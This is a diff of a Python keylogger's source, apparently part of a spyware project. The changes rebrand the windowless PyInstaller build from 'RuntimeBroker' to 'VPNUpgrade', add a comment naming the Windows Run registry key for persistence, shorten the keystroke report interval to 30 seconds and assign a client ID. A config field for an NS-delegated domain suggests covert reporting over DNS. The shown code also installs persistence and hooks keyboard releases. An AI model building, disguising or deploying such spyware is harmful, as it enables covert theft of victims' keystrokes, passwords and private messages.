@@ -1,4 +1,5 @@
-#py -m PyInstaller --onefile --noconsole --name "RuntimeBroker" --icon .\runtimebroker.ico --clean --version-file version.txt keylogger.py
+#py -m PyInstaller --onefile --noconsole --name "VPNUpgrade" --icon .\runtimebroker.ico --clean --version-file version.txt keylogger.py
+#Komputer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
 import keyboard
 from threading import Timer, Lock
 import time
@@ -14,9 +15,9 @@ import winreg
 import subprocess
 
 # CONFIG
-SendReport = 60                 # report time interval in seconds
+SendReport = 30                 # report time interval in seconds
 serverSuffix = ""               # NS delegated domain
-CLIENT_ID = 0                   # id number 0–65535
+CLIENT_ID = 10001               # id number 0–65535
 
 #golbal session id do not edit
 session_counter = 0
@@ -183,7 +184,7 @@ class Keylogger:
             self.install_persistence()
         except Exception as e:
             pass
-        #     print(f"[-] Persistence failed: {e}")
+        # #     print(f"[-] Persistence failed: {e}")
 
         # start the keylogger
         keyboard.on_release(callback=self.callback)
